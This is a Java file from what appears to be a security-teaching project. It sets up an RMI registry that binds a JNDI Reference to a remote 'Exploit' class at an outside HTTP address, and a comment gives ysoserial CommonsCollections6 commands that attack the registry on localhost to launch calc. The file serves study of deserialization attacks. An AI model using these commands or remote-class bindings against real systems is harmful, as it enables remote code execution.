package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ToAttackRegistry_ysoserial_Server_Success {

    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(12133);
        // 下面这行 参数随便加，主要是为了开启注册器监听。
        Reference reference = new Reference("Exploit","Exploit","http://8.8.8.8:1111/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("RCE",wrapper);
    }

    /**
     * 直接上ysoserial.jar打就行：
     *      @poc1  java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 12133 CommonsCollections6 calc
     *      @poc2  java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 12133 CommonsCollections6 calc
     */
}
